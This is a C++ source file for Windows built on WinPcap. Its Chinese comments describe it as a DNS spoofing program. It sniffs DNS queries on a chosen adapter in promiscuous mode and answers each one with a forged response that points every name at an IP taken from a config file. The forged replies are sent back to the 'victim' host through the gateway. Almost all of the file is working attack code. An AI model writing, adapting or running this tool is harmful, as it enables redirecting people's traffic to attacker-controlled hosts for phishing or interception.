//By Dexter Ju
//email:jvdajd@gmail.com
//website:kutopia.me
//用于进行DNS欺骗的程序
//请在相同目录下包含config_DNS.txt
//内容为
//ip proto udp and dst port 53 


#include "stdafx.h"
#include <winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <mstcpip.h>
#include "struct.h"
#include <pcap.h>
#include "ip_address.h"
#include <thread>
#include <string>
#include <iostream>
#include<fstream>

#pragma comment(lib, "Ws2_32.lib")


#define BUFF_SIZE 65535//缓存大小
#define TYPE_IP 0X0800

char errbuf[PCAP_ERRBUF_SIZE];
int int_num = 0;
u_char gateway_mac[6];
ip_pkt * ip_header = NULL;
u_int netmask_source;
u_int netmask_destination;
u_int ip_source = NULL;//源端网卡的ip地址
u_int ip_destination = NULL;//目的地网卡的IP地址
u_int ip_victim = NULL;//受害主机的IP
u_int ip_gateway = NULL;//转发网卡的网关IP

const char * packet_filter_s = NULL;
const char * packet_filter_d = NULL;
struct bpf_program fcode_s;//源端过滤器
struct bpf_program fcode_d;//目的地端过滤器

pcap_addr_t *a;
pcap_t * source_winpcap = NULL;//source句柄
pcap_t * destination_winpcap = NULL;//destination句柄
pcap_if_t *alldevs;//用于显示设备列表的指针
pcap_if_t *d;//用于显示设备列表的指针

in_addr destination_in_addr;
u_char source_mac[6] = { NULL };//源端网卡的MAC地址
u_char destination_mac[6] = { NULL };//目的端网卡的MAC地址
u_char from_mac[6] = { NULL };//源端来源的mac地址

const char * target = NULL; //伪装的目标站点
char * resolve_ip = NULL;
std::string target_s;
std::string redriect_address;
char internet_gateway[15] = { NULL };//因特网网关地址
char ifile_buff[2][100] = { NULL };

u_char source_buff[BUFF_SIZE] = { NULL };//源端缓存
u_char destination_buff[BUFF_SIZE] = { NULL };//目的端缓存
u_long victim_address = { NULL };//受害者IP地址


std::ifstream ifile;

int inum;
int i = 0;

//初始化网关MAC地址




void source_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
void destination_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);


void destination_fun(){
	std::cout << "开始监听" << std::endl;
	pcap_loop(destination_winpcap, 0, (pcap_handler)destination_handler, NULL);
}

void destination_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)//收到包之后的回调函数，将所有的DNS均解析到同一地址
{
	//处理从因特网返回的TCP包，并对其进行处理，返回给源端
	et_header *eth_ptr_q;
	ip_pkt * ip_ptr_q;
	UDP_Header *udp_ptr_q;
	eth_ptr_q = (et_header *)pkt_data;
	ip_ptr_q = (ip_pkt *)(pkt_data + ETH_HEADER);//针对target进行IP筛选
	udp_ptr_q = (UDP_Header *)(pkt_data + ETH_HEADER + IP_HEADER);
	//确认是由重定向目标返回的包

	if (fliter_mac(eth_ptr_q->eh_src, source_mac))
	{
		//ip已经填写为targetIP，需要用MAC地址进行筛选,防止捕捉到由source发出的伪造包，检测sourcemac是否为本机，如果为本机则丢弃
		return;

	}
	et_header * eth_ptr_a;
	ip_pkt * ip_ptr_a;
	UDP_Header * udp_ptr_a;
	DNS_HEADER * dns_ptr_a;
	answer * dns_answer_a;
	memcpy(destination_buff, pkt_data, header->len);
	eth_ptr_a = (et_header*)destination_buff;
	ip_ptr_a = (ip_pkt *)(destination_buff + ETH_HEADER);//开始填包
	udp_ptr_a = (UDP_Header *)(destination_buff + ETH_HEADER + IP_HEADER);
	dns_ptr_a = (DNS_HEADER *)(destination_buff + ETH_HEADER + IP_HEADER + UDP_HEADER);
	dns_answer_a = (answer *)(destination_buff + header->len);
	memcpy(eth_ptr_a->eh_dst, gateway_mac, 6);//填写本地MAC网关地址
	memcpy(eth_ptr_a->eh_src, destination_mac, 6);
	eth_ptr_a->eh_type = htons(TYPE_IP);
	ip_ptr_a->src = ip_ptr_q->dst;//填写目标网站IP
	ip_ptr_a->dst = ip_ptr_q->src;//填写受害者IP
	ip_ptr_a->len = htons(header->len + sizeof(answer) - ETH_HEADER);
	ip_ptr_a->cksum = 0;
	ip_ptr_a->cksum = in_cksum((u_short *)ip_ptr_a, 20);
	udp_ptr_a->DstPort = udp_ptr_q->SrcPort;
	udp_ptr_a->SrcPort = udp_ptr_q->DstPort;
	udp_ptr_a->Chksum = 0;
	udp_ptr_a->Len = htons(header->len + sizeof(answer) - IP_HEADER - ETH_HEADER);//需要计算
	dns_ptr_a->flags = htons(0x8180);
	dns_ptr_a->questions = htons(1);
	dns_ptr_a->answers = htons(1);
	dns_ptr_a->author = 0;
	dns_ptr_a->addition = 0;//填充分隔符
	dns_answer_a->partion = 0x0cc0;
	dns_answer_a->type = htons(0x0001);
	dns_answer_a->ttl = htonl(300);
	dns_answer_a->class_in = htons(1);
	dns_answer_a->data_len = htons(4);
	dns_answer_a->ip_addr.s_addr = inet_addr(resolve_ip);
	udp_cksum(destination_buff);



	if ((pcap_sendpacket(destination_winpcap, (u_char*)destination_buff,header->len+sizeof(answer))) != 0)
	{
		fprintf(stderr, "\nError sending the packet : \n", pcap_geterr(destination_winpcap));
		return;
	}

	memset(destination_buff, NULL, header->len + sizeof(answer));
	printf("欺骗DNS应答包发送成功，长度为：%d\n", ETH_HEADER + IP_HEADER + UDP_HEADER + sizeof(DNS_HEADER)+sizeof(answer));
	fflush(stdout);
	return;

}






int _tmain(int argc, _TCHAR* argv[])
{
	//读取配置文件
	ifile.open("conf_DNS.txt", std::ios::in);

	std::string config;
	int index = 0;
	while (ifile.getline(ifile_buff[index], 100)){
		index++;
	}
	packet_filter_d = ifile_buff[0];
	resolve_ip = ifile_buff[1];

	//进行网络设备的设置
	loadiphlpapi();
	//进行网卡的选择和初始化
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		return -1;
	}


	//打印设备列表
	for (d = alldevs; d; d = d->next)
	{
		ifprint(d, i);
		++i;
	}
	int_num = i;

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	//进行目的地设备的处理
	//destination
	//需要添加获取网关IP和mac地址的功能
	printf("Enter the interface number for source (1-%d):", int_num);//选择目的地设备
	fflush(stdout);
	scanf("%d", &inum);
	if (inum < 1 || inum > int_num)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* Jump to the selected adapter */
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);
	for (a = d->addresses; a; a = a->next) {
		switch (a->addr->sa_family)
		{
		case AF_INET:
			printf("\tAddress Family Name: AF_INET\n");
			if (a->addr)
				destination_in_addr = ((struct sockaddr_in *)a->addr)->sin_addr;
			ip_destination = ((struct sockaddr_in *)a->addr)->sin_addr.s_addr;//获取网卡IP
			if (a->netmask)
				netmask_destination = ((struct sockaddr_in *)a->netmask)->sin_addr.s_addr;//获取子网掩码
			break;
		default:
			continue;
		}
	}

	if (get_mac_address(d, destination_mac))
	{
		printf("获取MAC地址失败！");
		return -1;
	}
	/* Open the adapter */
	if ((destination_winpcap = pcap_open_live(d->name,	// name of the device
		65536,			// portion of the packet to capture. 
		// 65536 grants that the whole packet will be captured on all the MACs.
		1,				// promiscuous mode (nonzero means promiscuous)
		10,			// read timeout
		errbuf			// error buffer
		)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	//准备获取网关IP和mac地址

	get_gateway(destination_in_addr, internet_gateway);
	printf("因特网网关为%s\n", internet_gateway);
	ip_gateway = inet_addr(internet_gateway);
	get_gateway_mac_address(gateway_mac, ip_gateway);
	printf("网关的MAC地址为： %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",
		gateway_mac[0],
		gateway_mac[1],
		gateway_mac[2],
		gateway_mac[3],
		gateway_mac[4],
		gateway_mac[5]);


	if (pcap_compile(destination_winpcap, &fcode_d, packet_filter_d, 1, netmask_destination) <0)
	{
		fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	//设置过滤器
	if (pcap_setfilter(destination_winpcap, &fcode_d)<0)
	{
		fprintf(stderr, "\nError setting the filter.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}


	destination_fun();


	return 0;
}


